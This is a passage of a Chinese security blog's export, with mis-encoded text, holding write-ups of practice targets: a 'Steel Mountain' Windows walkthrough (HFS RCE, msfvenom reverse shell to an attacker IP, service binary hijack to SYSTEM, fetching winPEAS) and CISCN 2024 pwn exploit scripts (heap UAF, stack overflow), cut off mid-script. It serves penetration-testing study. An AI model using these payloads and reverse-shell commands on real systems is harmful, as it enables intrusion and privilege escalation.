title="åæ€"></a>åæ€</h1><p>æŸ¥çœ‹wpï¼Œæœ‰ä¸€äº›è‡ªå·±ä¸æ›¾æƒ³åˆ°çš„æ€è·¯</p><ul><li><p>SQLæ³¨å…¥<br>åœ¨ &#x2F;sql é¡µé¢å­˜åœ¨SQLæ³¨å…¥<br><img src="/Red_FILE/6f031c78ae9611cfa2ea0fa603a488d0_MD5.jpeg"><br>å¯ä»¥å°è¯•å†™é©¬</p></li><li><p>çˆ†ç ´ssh<br>sshæ˜¯å¼±å¯†ç ï¼Œå¯ä»¥å°è¯•ç”¨ hydra çˆ†ç ´</p></li><li><p>phpmyadmin<br>åœ¨ &#x2F;hehe ç›®å½•æ˜¯phpmyadminï¼Œå¯†ç root:root</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> è¿›æ”»æ€§æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æ‰“é¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Steel Mountain</title>
      <link href="/2024/06/29/Steel%20Mountain/"/>
      <url>/2024/06/29/Steel%20Mountain/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ä¾µå…¥ä»¥æœºå™¨äººå…ˆç”Ÿä¸ºä¸»é¢˜çš„ Windows æœºå™¨ã€‚ä½¿ç”¨metasploitè¿›è¡Œåˆå§‹è®¿é—®ï¼Œåˆ©ç”¨powershellè¿›è¡ŒWindowsæƒé™å‡çº§æšä¸¾ï¼Œå¹¶å­¦ä¹ ä¸€ç§æ–°æŠ€æœ¯æ¥è·å¾—ç®¡ç†å‘˜è®¿é—®æƒé™ã€‚</p></blockquote><h1 id="å…¥ä¾µ"><a href="#å…¥ä¾µ" class="headerlink" title="å…¥ä¾µ"></a>å…¥ä¾µ</h1><p>æœ€ä½³å‘˜å·¥ï¼Ÿç¡®å®šè¯¥å‘˜å·¥åå­—ä¸º Bill Harper<br><img src="/Red_FILE/5ecf1efebac7f0c7020d7cb274cd7d2f_MD5.jpeg"><br>æ‰«ä¸‹ç«¯å£ï¼Œç›®æ ‡æœºå™¨æ˜¯Windows Serverï¼Œå¼€å¯å¦‚ä¸‹ç«¯å£ï¼š</p><ul><li>80ã€8080ï¼šhttp</li><li>3389ï¼šrdp</li><li>135</li><li>139</li><li>445</li></ul><p>å°è¯•åæ²¡æœ‰ms17</p><p>80ç«¯å£é¦–é¡µæ˜¯ä¸ªé™æ€é¡µé¢ï¼Œè€Œ8080æ˜¯ä¸ªHttpFileServer<br><img src="/Red_FILE/e546830f2bf6ff321f83bbeafb1eb693_MD5.jpeg"><br>login ç™»å½•éœ€è¦å¯†ç </p><p>æ³¨æ„åˆ° HFS ç‰ˆæœ¬ä¸º rejetto 2.3ï¼Œæœ‰å†å²CVEï¼Œå¯ä»¥ç›´æ¥RCE<br><img src="/Red_FILE/8813e2ac62ce698796fea7806608a481_MD5.jpeg"><br>ä½¿ç”¨msfæ‹¿åˆ°shellï¼ˆç”¨searchsploitæä¾›çš„49584.pyä¹Ÿè¡Œï¼Œä½†è‚¯å®šæ²¡æœ‰meterpreteræ–¹ä¾¿ï¼‰<br><img src="/Red_FILE/8b6129513f47806d99796bd4acc34636_MD5.jpeg"></p><p>å…ˆç¡®å®šä¸€äº›åŸºæœ¬ä¿¡æ¯<br><img src="/Red_FILE/6e900810e5ef2f68a42045b3ac04ccb4_MD5.jpeg"><br>è¯¥è®¡ç®—æœºç”¨æˆ·æ˜¯<code>steelmountain\bill</code></p><h1 id="ææƒï¼ˆä¿®æ”¹æœåŠ¡è·¯å¾„ï¼‰"><a href="#ææƒï¼ˆä¿®æ”¹æœåŠ¡è·¯å¾„ï¼‰" class="headerlink" title="ææƒï¼ˆä¿®æ”¹æœåŠ¡è·¯å¾„ï¼‰"></a>ææƒï¼ˆä¿®æ”¹æœåŠ¡è·¯å¾„ï¼‰</h1><p>åœ¨å¸¸è§„çš„å¯†ç æœé›†æ— æœåï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå¯ç”¨æœåŠ¡</p><p>å¯¼å…¥PowerUp.ps1ï¼Œä¸€ä¸ªæœåŠ¡è¿›å…¥è§†é‡ï¼š</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">ServiceName                     : AdvancedSystemCareService9Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exeModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exeModifiableFilePermissions       : &#123;WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...&#125;ModifiableFileIdentityReference : STEELMOUNTAIN\billStartName                       : LocalSystemAbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'CanRestart                      : TrueName                            : AdvancedSystemCareService9Check                           : Modifiable Service Files  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¯¥å¯æ‰§è¡Œæ–‡ä»¶ä½äº<code>C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe</code>ï¼ŒæœåŠ¡å¯åŠ¨ç”¨æˆ·æ˜¯SYSTEMï¼Œå¯ä¿®æ”¹è€…æ­£æ˜¯billï¼Œå¹¶å…è®¸æˆ‘ä»¬é‡æ–°å¯åŠ¨ç³»ç»Ÿä¸Šçš„æœåŠ¡</p><p>å°†å…¶æ›¿æ¢ä¸ºæˆ‘ä»¬çš„æœ¨é©¬æ–‡ä»¶ï¼Œä¾¿èƒ½ä»¥SYSTEMæƒé™åå¼¹shell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> windows/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">10.11</span>.84.153 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4443</span> <span class="token parameter variable">-f</span> exe-service <span class="token parameter variable">-o</span> ASCService.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> shell C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>bill<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Startup<span class="token operator">></span> sc stop AdvancedSystemCareService9meterpreter <span class="token operator">></span> upload ASCService.exe <span class="token string">"C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"</span>meterpreter <span class="token operator">></span> shell C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>bill<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Startup<span class="token operator">></span> sc start AdvancedSystemCareService9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/Red_FILE/b5c5d470ac35cc0b0589a84f727c13df_MD5.jpeg"></p><h1 id="ææƒï¼ˆåˆ©ç”¨æ— å¼•å·åŒ¹é…ï¼‰"><a href="#ææƒï¼ˆåˆ©ç”¨æ— å¼•å·åŒ¹é…ï¼‰" class="headerlink" title="ææƒï¼ˆåˆ©ç”¨æ— å¼•å·åŒ¹é…ï¼‰"></a>ææƒï¼ˆåˆ©ç”¨æ— å¼•å·åŒ¹é…ï¼‰</h1><p>searchsploitåå¼¹shellï¼ˆ49584.pyï¼Œæ”¹ä¸‹ipå’Œç«¯å£ï¼‰<br><img src="/Red_FILE/f44343ee3ac32fb179edf2991bfce62d_MD5.jpeg"><br>powershell -c ä¸Šä¼ winPEAS</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">PS C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt; powershell -c &quot;wget http:&#x2F;&#x2F;10.11.84.153:8080&#x2F;winPEASany.exe&quot; -outfile &quot;winPEASany.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰§è¡Œå¹¶ä¸‹è½½è¾“å‡º</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">PS C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt; .\winPEASany.exe &gt; peas.txtPS C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å‰©ä¸‹çš„æ“ä½œåŒç†</p>]]></content>
      
      
      <categories>
          
          <category> è¿›æ”»æ€§æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æ‰“é¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2024åä¸­èµ›åŒºé€‰æ‹”èµ›</title>
      <link href="/2024/06/24/CISCN2024%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9B/"/>
      <url>/2024/06/24/CISCN2024%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æ‹¿ä¸‹ç¬¬8åï¼Œä¸æ‰æ­¤è¡Œå§</p></blockquote><p><img src="/EXP_FILE/a93659a4e81aa611ef0c9e7fa4bcc640_MD5.jpeg"><br><img src="/EXP_FILE/080007363601715580c7f21bb36ab8c9_MD5.jpeg"></p><h1 id="note"><a href="#note" class="headerlink" title="note"></a>note</h1><p>2.31 UAFï¼Œtcache æ‰“__free_hookå³å¯</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>sa<span class="token punctuation">(</span><span class="token string">'5. exit'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'The size of your content: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'The size of your content: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1ecbe0</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>free_hook<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">)</span>system<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 100"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./pwn.patch'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è‡³äºpatchï¼Œæˆ‘ç›´æ¥æŠŠ free è¿™æ¡ä»£ç åˆ é™¤äº†<br><img src="/EXP_FILE/799389c69a658f8d66246317506c0518_MD5.jpeg"></p><h1 id="protoverflow"><a href="#protoverflow" class="headerlink" title="protoverflow"></a>protoverflow</h1><p>å°±æ˜¯ä¸€ä¸ªprotobufçš„åºåˆ—åŒ–ï¼Œæ ˆæº¢å‡ºï¼Œæˆ‘ç›´æ¥æ‰“çš„one_gadget</p><pre class="line-numbers language-protobuf" data-language="protobuf"><code class="language-protobuf"><span class="token keyword">syntax</span> <span class="token operator">=</span> <span class="token string">"proto2"</span><span class="token punctuation">;</span><span class="token keyword">message</span> <span class="token class-name">protoMessage</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">optional</span> <span class="token builtin">string</span> name <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">optional</span> <span class="token builtin">string</span> phoneNumber <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">required</span> <span class="token builtin">bytes</span> buffer <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">required</span> <span class="token builtin">uint32</span> size <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">import</span> message_pb2<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">message</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>phoneNumber<span class="token punctuation">,</span><span class="token builtin">buffer</span><span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>msg<span class="token operator">=</span>message_pb2<span class="token punctuation">.</span>protoMessage<span class="token punctuation">(</span><span class="token punctuation">)</span>msg<span class="token punctuation">.</span>name<span class="token operator">=</span>namemsg<span class="token punctuation">.</span>phoneNumber<span class="token operator">=</span>phoneNumbermsg<span class="token punctuation">.</span><span class="token builtin">buffer</span><span class="token operator">=</span><span class="token builtin">buffer</span>msg<span class="token punctuation">.</span>size<span class="token operator">=</span>size<span class="token keyword">return</span> msg<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>ru<span class="token punctuation">(</span><span class="token string">'Gift: 0x'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>puts<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>puts<span class="token operator">-</span>ls<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts<span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>one<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x4f2a5</span><span class="token punctuation">,</span><span class="token number">0x4f302</span><span class="token punctuation">,</span><span class="token number">0x10a2fc</span><span class="token punctuation">]</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x210</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">'b *$rebase(0x0000000000003344)'</span><span class="token punctuation">)</span>s<span class="token punctuation">(</span>message<span class="token punctuation">(</span><span class="token string">'xxx'</span><span class="token punctuation">,</span><span class="token string">'1234'</span><span class="token punctuation">,</span>payload<span class="token punctuation">,</span><span class="token number">0x300</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#dbg('')</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 100"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./pwn.patch'</span>context<span class="token punctuation">.</span>log_level<span class="token 